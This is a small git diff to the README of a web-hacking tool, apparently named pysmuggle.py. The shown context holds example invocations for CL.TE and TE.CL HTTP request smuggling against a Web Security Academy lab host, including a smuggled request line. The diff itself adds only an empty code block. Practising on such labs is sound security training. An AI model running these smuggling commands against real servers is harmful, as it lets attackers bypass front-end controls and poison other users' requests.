@@ -10,6 +10,8 @@ Scripts related to web/request smuggling & general web hacking.
 ## Examples
 *Note: passing arguments denoted by pairs of quotations (",') is necessary for request fields which may contain spaces or special charachters*
 ### CL.TE Vulnerability
+```python
+```
 `python3 pysmuggle.py --host "your-access-token.web-security-academy.net" --method "POST" --body-length "35" --body-data ""  --smuggled-body-fields "GET /404 HTTP/1.1,X-Ignore: X" --debug "1"`
 ### TE.CL Vulnerability
 `python3 pysmuggle.py --host "your-access-token.web-security-academy.net" --method "POST" --body-length "4" --body-data "5c"`
